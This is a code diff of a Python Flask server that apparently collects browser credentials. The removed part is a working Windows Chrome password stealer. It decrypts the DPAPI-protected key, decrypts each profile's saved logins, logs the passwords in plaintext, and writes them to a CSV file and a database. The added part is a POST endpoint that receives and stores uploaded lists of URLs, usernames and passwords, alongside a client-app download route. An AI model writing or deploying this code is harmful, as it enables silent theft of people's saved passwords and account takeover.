@@ -209,210 +209,6 @@ def delete_all_user_data():
         logger.error(f"Unexpected error in delete_all_user_data: {str(e)}")
         return jsonify({"error": "An unexpected error occurred"}), 500
 
-def add_user_data(url, username, password, timestamp):
-    try:
-        # Insert the new record into the database
-        conn = get_db_connection()
-        if not conn:
-            logger.error("Database connection failed in add_user_data")
-            return False
-            
-        cursor = conn.cursor()
-        cursor.execute('''
-            INSERT OR REPLACE INTO decrypt_password (url, username, password, timestamp) 
-            VALUES (?, ?, ?, ?)
-        ''', (url, username, password, timestamp))
-        conn.commit()
-        conn.close()
-        return True
-    except sqlite3.Error as e:
-        logger.error(f"Database error in add_user_data: {str(e)}")
-        return False
-    except Exception as e:
-        logger.error(f"Unexpected error in add_user_data: {str(e)}")
-        return False
-
-def extract_windows_chrome_passwords():
-    try:
-        
-        CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
-        CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
-
-        if not os.path.exists(CHROME_PATH):
-            return jsonify({"error": "Chrome user data directory not found"}), 404
-            
-        if not os.path.exists(CHROME_PATH_LOCAL_STATE):
-            return jsonify({"error": "Chrome local state file not found"}), 404
-
-        def get_secret_key():
-            try:
-                #(1) Get secretkey from chrome local state
-                with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
-                    local_state = f.read()
-                    local_state = json.loads(local_state)
-                secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                #Remove suffix DPAPI
-                secret_key = secret_key[5:] 
-                secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
-                return secret_key
-            except json.JSONDecodeError as e:
-                logger.error(f"JSON decode error: {str(e)}")
-                return None
-            except Exception as e:
-                logger.error(f"Error getting secret key: {str(e)}")
-                return None
-            
-        def decrypt_payload(cipher, payload):
-            try:
-                return cipher.decrypt(payload)
-            except Exception as e:
-                logger.error(f"Decrypt payload error: {str(e)}")
-                return None
-
-        def generate_cipher(aes_key, iv):
-            try:
-                return AES.new(aes_key, AES.MODE_GCM, iv)
-            except Exception as e:
-                logger.error(f"Generate cipher error: {str(e)}")
-                return None
-
-        def decrypt_password(ciphertext, secret_key):
-            try:
-                #(3-a) Initialisation vector for AES decryption
-                initialisation_vector = ciphertext[3:15]
-                #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
-                #Encrypted password is 192 bits
-                encrypted_password = ciphertext[15:-16]
-                #(4) Build the cipher to decrypt the ciphertext
-                cipher = generate_cipher(secret_key, initialisation_vector)
-                if not cipher:
-                    return ""
-                    
-                decrypted_pass = decrypt_payload(cipher, encrypted_password)
-                if not decrypted_pass:
-                    return ""
-                    
-                decrypted_pass = decrypted_pass.decode()  
-                return decrypted_pass
-            except Exception as e:
-                logger.error(f"Password decryption error: {str(e)}")
-                return ""
-            
-        def get_db_connection_chrome(chrome_path_login_db):
-            try:
-                logger.info(f"Accessing Chrome DB: {chrome_path_login_db}")
-                if os.path.exists("Loginvault.db"):
-                    os.remove("Loginvault.db")
-                shutil.copy2(chrome_path_login_db, "Loginvault.db") 
-                return sqlite3.connect("Loginvault.db")
-            except Exception as e:
-                logger.error(f"Chrome database connection error: {str(e)}")
-                return None
-                
-        results = []
-        #Create Dataframe to store passwords
-        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
-            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
-            csv_writer.writerow(["index","url","username","password"])
-            #(1) Get secret key
-            secret_key = get_secret_key()
-            if not secret_key:
-                return jsonify({"error": "Could not retrieve Chrome secret key"}), 500
-                
-            #Search user profile or default folder (this is where the encrypted login password is stored)
-            try:
-                folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
-            except Exception as e:
-                logger.error(f"Error listing Chrome profiles: {str(e)}")
-                return jsonify({"error": "Could not access Chrome profiles"}), 500
-                
-            for folder in folders:
-                #(2) Get ciphertext from sqlite database
-                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
-                conn = get_db_connection_chrome(chrome_path_login_db)
-                if(secret_key and conn):
-                    try:
-                        cursor = conn.cursor()
-                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                        for index,login in enumerate(cursor.fetchall()):
-                            url = login[0]
-                            username = login[1]
-                            ciphertext = login[2]
-                            if(url!="" and username!="" and ciphertext!=""):
-                                #(3) Filter the initialisation vector & encrypted password from ciphertext 
-                                #(4) Use AES algorithm to decrypt the password
-                                decrypted_password = decrypt_password(ciphertext, secret_key)
-                                logger.info(f"Sequence: {index}")
-                                logger.info(f"URL: {url}, User Name: {username}, Password: {decrypted_password}")
-                                
-                                # Save to database
-                                timestamp = str(time.time())
-                                success = add_user_data(url=url, username=username, password=decrypted_password, timestamp=timestamp)
-                                if success:
-                                    results.append({"url": url, "username": username, "password": decrypted_password})
-                                
-                                csv_writer.writerow([index,url,username,decrypted_password])
-                    except sqlite3.Error as e:
-                        logger.error(f"SQLite error processing Chrome logins: {str(e)}")
-                    except Exception as e:
-                        logger.error(f"Error processing Chrome logins: {str(e)}")
-                    finally:
-                        #Close database connection
-                        if conn:
-                            cursor.close()
-                            conn.close()
-                        #Delete temp login db
-                        if os.path.exists("Loginvault.db"):
-                            try:
-                                os.remove("Loginvault.db")
-                            except Exception as e:
-                                logger.error(f"Error removing temporary login DB: {str(e)}")
-        
-        return jsonify(results)
-    except Exception as e:
-        logger.error(f"Unhandled exception in user_password: {str(e)}")
-        return jsonify({"error": f"An unexpected error occurred: {str(e)}"}), 500
-
-@app.route('/api/user-password', methods=['GET'])
-def user_password():
-    try:
-        system = platform.system()
-        
-        if system == 'Windows':
-            return extract_windows_chrome_passwords()
-        elif system == 'Linux':
-            # On Linux, just return any passwords already in the database
-            try:
-                conn = get_db_connection()
-                if not conn:
-                    return jsonify({"error": "Database connection failed"}), 500
-                    
-                cursor = conn.cursor()
-                cursor.execute('SELECT * FROM decrypt_password')
-                rows = cursor.fetchall()
-                
-                # Return the data as JSON
-                data = []
-                for row in rows:
-                    data.append(dict(row))
-                
-                conn.close()
-                if data:
-                    return jsonify(data)
-                else:
-                    return jsonify({"message": "No saved passwords available"}), 200
-            except Exception as e:
-                logger.error(f"Error retrieving saved passwords: {str(e)}")
-                return jsonify({"error": "Linux extraction not implemented, and no saved passwords found"}), 501
-        elif system == 'Darwin':  # macOS
-            return jsonify({"error": "macOS Chrome password extraction not implemented"}), 501
-        else:
-            return jsonify({"error": f"Unsupported platform: {system}"}), 400
-            
-    except Exception as e:
-        logger.error(f"Unhandled exception in user_password: {str(e)}")
-        return jsonify({"error": f"An unexpected error occurred: {str(e)}"}), 500
-
 @app.route('/api/download/client-app', methods=['GET'])
 def download_client_app():
     try:
@@ -449,6 +245,88 @@ def download_client_app():
         logger.error(f"Stack trace: {traceback.format_exc()}")
         return jsonify({"error": f"Client application not available: {str(e)}"}), 404
 
+def add_user_data(entries, connection=None):
+    """
+    Add password entries to database
+    
+    Args:
+        entries: Either a single dict or a list of dicts with url, username, password, timestamp
+        connection: Optional existing database connection
+        
+    Returns:
+        count: Number of entries added
+    """
+    close_connection = False
+    try:
+        # Handle connection
+        if not connection:
+            connection = get_db_connection()
+            close_connection = True
+        
+        if not connection:
+            logger.error("Failed to connect to database")
+            return 0
+        
+        # Convert single entry to list for unified processing
+        if not isinstance(entries, list):
+            entries = [entries]
+            
+        cursor = connection.cursor()
+        count = 0
+        
+        # Process all entries in a single transaction
+        for entry in entries:
+            # Extract values with defaults
+            url = entry.get('url', '')
+            username = entry.get('username', '')
+            password = entry.get('password', '')
+            timestamp = entry.get('timestamp', str(time.time()))
+            
+            # Skip invalid entries
+            if not url or not username or not password:
+                continue
+                
+            # Add to database
+            cursor.execute(
+                "INSERT OR REPLACE INTO decrypt_password (url, username, password, timestamp) VALUES (?, ?, ?, ?)",
+                (url, username, password, timestamp)
+            )
+            count += 1
+            
+        connection.commit()
+        return count
+        
+    except Exception as e:
+        logger.error(f"Error adding user data: {str(e)}")
+        return 0
+        
+    finally:
+        # Only close if we opened it
+        if close_connection and connection:
+            connection.close()
+
+@app.route('/api/user-password', methods=['POST'])
+def upload_user_password():
+    try:
+        data = request.json
+        if not data:
+            return jsonify({"error": "No data provided"}), 400
+            
+        # Validate data format
+        if not isinstance(data, list):
+            return jsonify({"error": "Invalid data format. Expected array of password entries"}), 400
+        
+        # Use our enhanced function
+        count = add_user_data(data)
+        
+        if count > 0:
+            return jsonify({"message": f"Successfully uploaded {count} passwords"}), 200
+        else:
+            return jsonify({"error": "Failed to upload passwords"}), 500
+            
+    except Exception as e:
+        logger.error(f"Error in upload_user_password: {str(e)}")
+        return jsonify({"error": f"An unexpected error occurred: {str(e)}"}), 500
 
 # Error handler for internal server errors
 @app.errorhandler(500)
